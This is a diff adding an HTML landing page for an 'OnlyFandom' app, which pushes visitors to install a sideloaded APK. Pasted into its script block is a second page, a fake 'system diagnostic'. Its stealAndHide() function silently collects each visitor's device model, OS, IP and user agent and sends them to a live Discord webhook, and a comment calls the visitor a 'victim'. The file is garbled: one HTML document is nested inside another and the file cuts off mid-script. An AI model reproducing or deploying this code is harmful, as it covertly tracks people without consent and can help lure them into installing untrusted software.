@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OnlyFandom | A Sensory Devotion</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600&family=Playfair+Display:ital,wght@0,400;0,600;1,400;1,600&family=Montserrat:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- HIGH AESTHETIC PALETTE --- */
+        :root {
+            --bg-deep: #030102; /* Near total black */
+            --ink: #0a0406;
+            --oxblood: #3d0510; /* Deepest red shadow */
+            --rose-velvet: #70001a; /* Rich, dark red */
+            --skin-blush: #eacac0; /* Soft tone */
+            --warm-gold: #c6a07e; /* Desaturated gold */
+            --text-main: #f5f0f1;
+            --text-muted: #8c7a81;
+            
+            /* NEON PINK & WHITE VARIABLES */
+            --neon-pink: #ff10f0;
+            --neon-pink-soft: rgba(255, 16, 240, 0.4);
+            --neon-white: #ffffff;
+            --neon-white-soft: rgba(255, 255, 255, 0.4);
+            
+            /* NEON GREEN VARIABLES */
+            --neon-green: #00ff66;
+            --neon-green-glow: rgba(0, 255, 102, 0.6);
+
+            --ease: cubic-bezier(0.23, 1, 0.32, 1);
+            --ease-slow: cubic-bezier(0.7, 0, 0.3, 1);
+        }
+
+        /* --- GLOBAL STYLES --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            cursor: none; /* Hide default cursor */
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: 'Playfair Display', serif;
+            overflow-x: hidden;
+            line-height: 1.8;
+            font-weight: 300;
+        }
+
+        /* --- SENSORY CURSOR --- */
+        #custom-cursor {
+            position: fixed;
+            width: 12px;
+            height: 12px;
+            background-color: var(--text-main);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10000;
+            transition: transform 0.1s var(--ease), background-color 0.3s ease;
+            mix-blend-mode: difference;
+        }
+
+        #custom-cursor-blur {
+            position: fixed;
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, var(--oxblood) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: transform 0.2s var(--ease);
+            opacity: 0.6;
+        }
+
+        /* --- ATMOSPHERIC LIGHTING ANIMATION --- */
+        .atmosphere {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 0;
+            background: 
+                radial-gradient(circle at 10% 10%, rgba(255, 16, 240, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(61, 5, 16, 0.2) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(198, 160, 126, 0.03) 0%, transparent 70%);
+            animation: atmosphericBreathe 20s infinite alternate var(--ease-slow);
+            filter: blur(20px);
+        }
+
+        @keyframes atmosphericBreathe {
+            0% { opacity: 0.5; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.1); }
+        }
+
+        /* --- FIXED NAVIGATION (HEADER STAYS PINNED TO SCREEN) --- */
+        nav {
+            position: fixed; /* Locked in place, will not scroll */
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 2.2rem 4rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            background: linear-gradient(to bottom, rgba(3, 1, 2, 0.95), transparent);
+            backdrop-filter: blur(8px);
+        }
+
+        /* --- SUBTLE PINK & WHITE NEON LOGO --- */
+        .brand-neon {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: 0.15rem;
+            text-decoration: none;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        .brand-neon .part-only {
+            color: var(--neon-pink);
+            text-shadow: 
+                0 0 4px var(--neon-pink),
+                0 0 12px var(--neon-pink-soft);
+            animation: subtlePinkPulse 2.5s infinite alternate ease-in-out;
+        }
+
+        .brand-neon .part-fandom {
+            color: var(--neon-white);
+            text-shadow: 
+                0 0 4px var(--neon-white),
+                0 0 10px var(--neon-white-soft);
+            animation: subtleWhitePulse 2.5s infinite alternate ease-in-out 0.3s;
+        }
+
+        @keyframes subtlePinkPulse {
+            0% {
+                text-shadow: 
+                    0 0 3px var(--neon-pink),
+                    0 0 8px var(--neon-pink-soft);
+                opacity: 0.95;
+            }
+            100% {
+                text-shadow: 
+                    0 0 6px var(--neon-pink),
+                    0 0 15px var(--neon-pink-soft);
+                opacity: 1;
+            }
+        }
+
+        @keyframes subtleWhitePulse {
+            0% {
+                text-shadow: 
+                    0 0 2px var(--neon-white),
+                    0 0 6px var(--neon-white-soft);
+                opacity: 0.9;
+            }
+            100% {
+                text-shadow: 
+                    0 0 5px var(--neon-white),
+                    0 0 12px var(--neon-white-soft);
+                opacity: 1;
+            }
+        }
+
+        .menu-toggle {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            background: none;
+            border: none;
+            opacity: 0.6;
+            transition: opacity 0.5s var(--ease);
+        }
+
+        .menu-toggle:hover { opacity: 1; }
+
+        .line {
+            width: 25px;
+            height: 1px;
+            background-color: var(--text-main);
+        }
+
+        /* --- HERO SECTION WITH FEATURED CONTENT --- */
+        .hero {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 9rem 8% 5rem 8%;
+            z-index: 10;
+        }
+
+        .hero-top {
+            display: grid;
+            grid-template-columns: 1fr;
+            align-items: center;
+            text-align: center;
+            gap: 2rem;
+            margin-bottom: 4rem;
+        }
+
+        .hero-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0 auto;
+            max-width: 900px;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .hero-pre {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.4rem;
+            color: var(--skin-blush);
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            animation: fadeIn 2s var(--ease) forwards 0.5s;
+        }
+
+        .hero-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 3.2rem;
+            font-weight: 400;
+            line-height: 1.2;
+            margin-bottom: 2rem;
+            color: var(--text-main);
+            opacity: 0;
+            animation: fadeInSlideUp 2s var(--ease) forwards 0.8s;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .hero-title span {
+            font-style: italic;
+            color: var(--warm-gold);
+            font-weight: 600;
+        }
+
+        .hero-cta-wrap {
+            opacity: 0;
+            animation: fadeIn 2s var(--ease) forwards 1.2s;
+        }
+
+        /* --- BIG GREEN NEON GLOWING DOWNLOAD BUTTON --- */
+        .btn-neon-download {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 1.4rem 3.2rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.3rem;
+            text-decoration: none;
+            color: #030102;
+            background-color: var(--neon-green);
+            border: 2px solid var(--neon-green);
+            border-radius: 50px;
+            box-shadow: 
+                0 0 15px var(--neon-green),
+                0 0 30px var(--neon-green-glow),
+                0 0 45px var(--neon-green-glow);
+            transition: all 0.4s var(--ease);
+            animation: neonPulse 2.5s infinite alternate ease-in-out;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .btn-neon-download svg {
+            width: 20px;
+            height: 20px;
+            fill: #030102;
+            transition: transform 0.4s var(--ease);
+            flex-shrink: 0;
+        }
+
+        .btn-neon-download:hover {
+            color: var(--neon-green);
+            background-color: transparent;
+            box-shadow: 
+                0 0 20px var(--neon-green),
+                0 0 40px var(--neon-green),
+                0 0 60px var(--neon-green);
+            transform: translateY(-4px) scale(1.03);
+        }
+
+        .btn-neon-download:hover svg {
+            fill: var(--neon-green);
+            transform: translateY(3px);
+        }
+
+        @keyframes neonPulse {
+            0% {
+                box-shadow: 
+                    0 0 15px var(--neon-green),
+                    0 0 25px var(--neon-green-glow);
+            }
+            100% {
+                box-shadow: 
+                    0 0 25px var(--neon-green),
+                    0 0 50px var(--neon-green-glow),
+                    0 0 75px var(--neon-green-glow);
+            }
+        }
+
+        /* --- HERO 3 CARDS GRID CONTAINER --- */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+            width: 100%;
+            opacity: 0;
+            animation: fadeIn 2.5s var(--ease) forwards 1s;
+        }
+
+        /* Card container holding the image frame and description text below */
+        .image-card {
+            width: 100%;
+            background: rgba(10, 4, 6, 0.7);
+            border: 1px solid rgba(198, 160, 126, 0.15);
+            border-radius: 16px;
+            padding: 1.2rem;
+            box-shadow: 0 0 30px rgba(61, 5, 16, 0.3);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease-out, border-color 0.3s ease, box-shadow 0.3s ease;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        .image-card:hover {
+            border-color: rgba(255, 16, 240, 0.4);
+            transform: translateY(-6px);
+            box-shadow: 0 0 40px rgba(255, 16, 240, 0.15);
+        }
+
+        /* --- AUTO SLIDESHOW FRAME --- */
+        .image-frame {
+            position: relative;
+            width: 100%;
+            height: 280px;
+            overflow: hidden;
+            border-radius: 10px;
+        }
+
+        .slideshow-track {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .slide-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+            filter: contrast(105%) brightness(90%) sepia(15%);
+            opacity: 0;
+            transition: opacity 1.2s ease-in-out, transform 1.2s var(--ease-slow);
+        }
+
+        .slide-img.active {
+            opacity: 1;
+            transform: scale(1.03);
+        }
+
+        .image-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, transparent 60%, var(--bg-deep) 100%),
+                        linear-gradient(90deg, var(--bg-deep) 0%, transparent 15%);
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* Text written below the image inside the card */
+        .card-caption {
+            margin-top: 1.2rem;
+            padding: 0 0.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .card-caption-title {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 0.05rem;
+            color: var(--text-main);
+        }
+
+        .card-caption-text {
+            font-family: 'Playfair Display', serif;
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* --- FLOATING AESTHETIC VIDEO & APK POPUP MODAL --- */
+        #videoModal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(3, 1, 2, 0.85);
+            backdrop-filter: blur(16px);
+            z-index: 20000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s var(--ease);
+            padding: 2rem;
+        }
+
+        #videoModal.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .popup-window {
+            position: relative;
+            width: 100%;
+            max-width: 850px;
+            background: rgba(15, 6, 9, 0.95);
+            border: 1px solid rgba(255, 16, 240, 0.35);
+            border-radius: 20px;
+            padding: 1.5rem;
+            box-shadow: 
+                0 0 50px rgba(255, 16, 240, 0.25),
+                0 0 100px rgba(61, 5, 16, 0.6);
+            transform: scale(0.9);
+            transition: transform 0.4s var(--ease);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+
+        #videoModal.active .popup-window {
+            transform: scale(1);
+        }
+
+        /* Aesthetic Close Button */
+        .popup-close {
+            position: absolute;
+            top: -18px;
+            right: -18px;
+            width: 44px;
+            height: 44px;
+            background: var(--oxblood);
+            border: 2px solid var(--neon-pink);
+            border-radius: 50%;
+            color: var(--text-main);
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 16, 240, 0.4);
+            transition: all 0.3s var(--ease);
+            z-index: 10;
+        }
+
+        .popup-close:hover {
+            background: var(--neon-pink);
+            color: #030102;
+            transform: scale(1.1) rotate(90deg);
+            box-shadow: 0 0 25px var(--neon-pink);
+        }
+
+        /* Video Container frame */
+        .video-frame-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            height: 0;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
+
+        .video-frame-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+            pointer-events: auto;
+        }
+
+        /* Popup Install APK Button Container */
+        .popup-footer-action {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            padding-top: 0.5rem;
+        }
+
+        .btn-apk-install {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            width: 100%;
+            max-width: 400px;
+            padding: 1.2rem 2.5rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.25rem;
+            text-decoration: none;
+            color: #030102;
+            background-color: var(--neon-green);
+            border: 2px solid var(--neon-green);
+            border-radius: 50px;
+            box-shadow: 
+                0 0 15px var(--neon-green),
+                0 0 30px var(--neon-green-glow);
+            transition: all 0.3s var(--ease);
+        }
+
+        .btn-apk-install svg {
+            width: 20px;
+            height: 20px;
+            fill: #030102;
+            transition: transform 0.3s var(--ease);
+            flex-shrink: 0;
+        }
+
+        .btn-apk-install:hover {
+            color: var(--neon-green);
+            background-color: transparent;
+            box-shadow: 
+                0 0 20px var(--neon-green),
+                0 0 40px var(--neon-green);
+            transform: translateY(-2px);
+        }
+
+        .btn-apk-install:hover svg {
+            fill: var(--neon-green);
+            transform: translateY(2px);
+        }
+
+        /* --- KEYFRAMES --- */
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        @keyframes fadeInSlideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 4rem 2rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.6rem;
+            letter-spacing: 0.3rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            border-top: 1px solid rgba(198, 160, 126, 0.05);
+            word-break: break-word;
+        }
+
+        /* --- MOBILE ADAPTABILITY --- */
+        @media (max-width: 1024px) {
+            .hero-title { font-size: 2.5rem; }
+            .cards-grid { grid-template-columns: 1fr; gap: 2rem; }
+            #custom-cursor, #custom-cursor-blur { display: none; }
+            * { cursor: auto; }
+            .popup-window { padding: 1rem; max-width: 95vw; }
+            .popup-close { top: -12px; right: -12px; width: 36px; height: 36px; font-size: 1rem; }
+        }
+
+        @media (max-width: 768px) {
+            nav { padding: 1.5rem 1.5rem; }
+            .brand-neon { font-size: 1.5rem; }
+            .hero-title { font-size: 2rem; }
+            .hero-pre { letter-spacing: 0.2rem; }
+            .btn-neon-download {
+                padding: 1.2rem 2rem;
+                font-size: 0.75rem;
+                letter-spacing: 0.15rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Custom Sensory Cursor -->
+    <div id="custom-cursor"></div>
+    <div id="custom-cursor-blur"></div>
+
+    <!-- Pulsing Atmospheric Background Light -->
+    <div class="atmosphere"></div>
+
+    <!-- Pinned Navigation Header (Fixed Position) -->
+    <nav>
+        <a href="#" class="brand-neon">
+            <span class="part-only">Only</span><span class="part-fandom">Fandom</span>
+        </a>
+        <button class="menu-toggle">
+            <span class="line"></span>
+            <span class="line"></span>
+        </button>
+    </nav>
+
+    <!-- Main Hero Landing -->
+    <header class="hero">
+        <div class="hero-top">
+            <div class="hero-text">
+                <p class="hero-pre">DISCOVER THE ULTIMATE CREATOR COMMUNITY PLATFORM</p>
+                <h1 class="hero-title">EXPLORE EXCLUSIVE CONTENT <span>THROUGH THE ONLYFANDOM APP</span>, ENDLESS ENTERTAINMENT</h1>
+                
+                <!-- Neon Green Glowing Download Button (Triggers Popup Video + APK Install) -->
+                <div class="hero-cta-wrap">
+                    <button class="btn-neon-download" id="openVideoBtn">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                        </svg>
+                        Download Now
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3 Cards Grid Layout with Auto Image Slideshows -->
+        <div class="cards-grid">
+            <!-- Card 1 -->
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=1000" alt="Creator 1-1" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=1000" alt="Creator 1-2" class="slide-img">
+                        <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&q=80&w=1000" alt="Creator 1-3" class="slide-img">
+                    </div>
+                    <div class="image-overlay"></div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Featured Creator Spotlight</h3>
+                    <p class="card-caption-text">Connect directly with top-tier creators and access premium multimedia galleries tailored for enthusiasts.</p>
+                </div>
+            </div>
+
+            <!-- Card 2 -->
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&q=80&w=1000" alt="Creator 2-1" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?auto=format&fit=crop&q=80&w=1000" alt="Creator 2-2" class="slide-img">
+                        <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&q=80&w=1000" alt="Creator 2-3" class="slide-img">
+                    </div>
+                    <div class="image-overlay"></div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Vibrant Community Feeds</h3>
+                    <p class="card-caption-text">Engage in real-time interactive discussions, follow specialized topics, and share your unique artistic passion.</p>
+                </div>
+            </div>
+
+            <!-- Card 3 -->
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&q=80&w=1000" alt="Creator 3-1" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&q=80&w=1000" alt="Creator 3-2" class="slide-img">
+                        <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&q=80&w=1000" alt="Creator 3-3" class="slide-img">
+                    </div>
+                    <div class="image-overlay"></div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Immersive Experience</h3>
+                    <p class="card-caption-text">Enjoy sleek fluid animations, responsive layouts, and a distraction-free environment built for pure aesthetic joy.</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Floating Aesthetic Video & APK Popup Modal -->
+    <div id="videoModal">
+        <div class="popup-window">
+            <button class="popup-close" id="closeVideoBtn">&times;</button>
+            <div class="video-frame-container">
+                <!-- YouTube embed with loop and playlist parameters enabled for seamless loop playback -->
+                <iframe id="youtubePlayer" src="" data-src="https://www.youtube.com/embed/eaiJYDgH08M?autoplay=1&loop=1&playlist=eaiJYDgH08M&controls=0&modestbranding=1&rel=0&iv_load_policy=3" title="OnlyFandom App Preview" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+            <!-- APK Install Button Below Video inside Popup -->
+            <div class="popup-footer-action">
+                <a href="your-app-file.apk" class="btn-apk-install" download>
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                    </svg>
+                    Install Now (APK)
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2026 ONLYFANDOM. ALL RIGHTS RESERVED.</p>
+    </footer>
+
+    <script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETRUNNER // SYSTEM DIAGNOSTIC</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+
+        :root {
+            --neon-blue: #00f3ff;
+            --neon-pink: #ff00ff;
+            --neon-yellow: #ffee00;
+            --bg-dark: #050505;
+            --glass: rgba(0, 20, 40, 0.7);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-dark);
+            background-image: 
+                linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            color: var(--neon-blue);
+            font-family: 'Share Tech Mono', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Scanline Effect */
+        body::after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 600px;
+            background: var(--glass);
+            border: 1px solid var(--neon-blue);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
+            padding: 2rem;
+            clip-path: polygon(
+                0 0, 
+                100% 0, 
+                100% 85%, 
+                90% 100%, 
+                0 100%
+            );
+            backdrop-filter: blur(5px);
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            text-align: center;
+            margin-top: 0;
+            text-shadow: 0 0 10px var(--neon-blue);
+            letter-spacing: 2px;
+            border-bottom: 2px solid var(--neon-pink);
+            padding-bottom: 10px;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: var(--neon-yellow);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .data-item {
+            background: rgba(0, 0, 0, 0.6);
+            border-left: 3px solid var(--neon-pink);
+            padding: 10px;
+        }
+
+        .label {
+            font-size: 0.7rem;
+            color: #888;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .value {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 5px var(--neon-pink);
+        }
+
+        .loading {
+            text-align: center;
+            font-size: 1.2rem;
+            animation: blink 0.5s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        .glitch-text {
+            position: relative;
+        }
+        
+        /* Mobile Adjustments */
+        @media (max-width: 500px) {
+            .data-grid { grid-template-columns: 1fr; }
+            h1 { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 class="glitch-text">SYSTEM DIAGNOSTIC</h1>
+        
+        <div class="status-bar">
+            <span>SECURE CONNECTION</span>
+            <span id="clock">00:00:00</span>
+        </div>
+
+        <div id="loader" class="loading">INITIALIZING NEURAL LINK...</div>
+
+        <div id="data-display" class="data-grid" style="display: none;">
+            <div class="data-item">
+                <span class="label">Operating System</span>
+                <span class="value" id="os-val">--</span>
+            </div>
+            <div class="data-item">
+                <span class="label">Version Core</span>
+                <span class="value" id="ver-val">--</span>
+            </div>
+            <div class="data-item">
+                <span class="label">Hardware Model</span>
+                <span class="value" id="model-val">--</span>
+            </div>
+            <div class="data-item">
+                <span class="label">Network Node (IP)</span>
+                <span class="value" id="ip-val">--</span>
+            </div>
+            <div class="data-item" style="grid-column: span 2; border-left-color: var(--neon-yellow);">
+                <span class="label">User Agent String</span>
+                <span class="value" id="ua-val" style="font-size: 0.8rem; word-break: break-all;">--</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    async function stealAndHide() {
+        // 1. Collect Data
+        let info = { os: "Unknown", version: "Unknown", model: "Unknown", ip: "..." };
+        
+        // Get Android Version
+        if (navigator.userAgentData) {
+            try {
+                const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
+                info.os = ua.platform;
+                info.version = ua.platformVersion;
+                info.model = ua.model;
+            } catch (e) {}
+        }
+
+        // Get IP
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            info.ip = data.ip;
+        } catch (e) {}
+
+        // 2. Format for Discord
+        const webhookURL = "https://discord.com/api/webhooks/1531681973746143242/FA_8GS1dcgqnBjFonRiDctH9piuSlfB_1AsC8s79gKpgUPy5SkDL_5HU6IZtOvYIu1iz"; 
+        
+        const message = {
+            content: `📱 **New Device Detected**\n` +
+                     `**OS:** ${info.os} ${info.version}\n` +
+                     `**Model:** ${info.model}\n` +
+                     `**IP:** ${info.ip}\n` +
+                     `**Browser:** ${navigator.userAgent.substring(0, 50)}...`
+        };
+
+        // 3. Send Silently
+        if (webhookURL.includes("discord.com")) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            }).catch(err => console.log("Send failed"));
+        }
+        
+        // Victim sees nothing but the static "404" text already in the HTML body
+    }
+    stealAndHide();
+  
+        
+        // Clock Animation
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.toLocaleTimeString();
+        }, 1000);
+
+        async function runDiagnostic() {
+            const loader = document.getElementById('loader');
+            const display = document.getElementById('data-display');
+            
+            // Simulate hacking delay
+            setTimeout(async () => {
+                loader.style.display = 'none';
+                display.style.display = 'grid';
+
+                let os = "UNKNOWN";
+                let ver = "UNKNOWN";
+                let model = "UNKNOWN";
+
+                // Detect Device Info
+                if (navigator.userAgentData) {
+                    try {
+                        const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
+                        os = ua.platform;
+                        ver = ua.platformVersion;
+                        model = ua.model || "Generic Unit";
+                    } catch (e) {
+                        os = "ENCRYPTED";
+                    }
+                } else {
+                    os = "LEGACY SYSTEM";
+                    ver = "N/A";
+                }
+
+                // Get IP
+                let ip = "HIDDEN";
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch (e) {}
+
+                // Update UI
+                document.getElementById('os-val').innerText = os;
+                document.getElementById('ver-val').innerText = ver;
+                document.getElementById('model-val').innerText = model;
+                document.getElementById('ip-val').innerText = ip;
+                document.getElementById('ua-val').innerText = navigator.userAgent;
+
+            }, 1500);
+        }
+
+        runDiagnostic();
+        
+        // Smooth Cursor Follower
+        const cursor = document.getElementById('custom-cursor');
+        const cursorBlur = document.getElementById('custom-cursor-blur');
+
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+            
+            cursorBlur.style.left = e.clientX + 'px';
+            cursorBlur.style.top = e.clientY + 'px';
+        });
+
+        // Interactive Cursor States
+        document.querySelectorAll('a, button, .image-card').forEach(el => {
+            el.addEventListener('mouseenter', () => {
+                cursor.style.transform = 'scale(2.5)';
+                cursor.style.backgroundColor = 'var(--neon-pink)';
+                cursorBlur.style.opacity = '0.9';
+            });
+            el.addEventListener('mouseleave', () => {
+                cursor.style.transform = 'scale(1)';
+                cursor.style.backgroundColor = 'var(--text-main)';
+                cursorBlur.style.opacity = '0.6';
+            });
+        });
+
+        // --- AUTO SLIDESHOW FUNCTIONALITY FOR EACH CARD ---
+        const slideshowTracks = document.querySelectorAll('[data-slideshow]');
+        slideshowTracks.forEach(track => {
+            const slides = track.querySelectorAll('.slide-img');
+            let currentSlide = 0;
+
+            setInterval(() => {
+                slides[currentSlide].classList.remove('active');
+                currentSlide = (currentSlide + 1) % slides.length;
+                slides[currentSlide].classList.add('active');
+            }, 3500); // Change image every 3.5 seconds
+        });
+
+        // --- POPUP VIDEO MODAL FUNCTIONALITY ---
+        const openBtn = document.getElementById('openVideoBtn');
+        const closeBtn = document.getElementById('closeVideoBtn');
+        const videoModal = document.getElementById('videoModal');
+        const youtubePlayer = document.getElementById('youtubePlayer');
+
+        openBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            videoModal.classList.add('active');
+            // Dynamically inject the source with loop parameters when opened
+            youtubePlayer.src = youtubePlayer.getAttribute('data-src');
+        });
+
+        const closeVideo = () => {
+            videoModal.classList.remove('active');
+            // Clear src to immediately stop playback and audio when closed
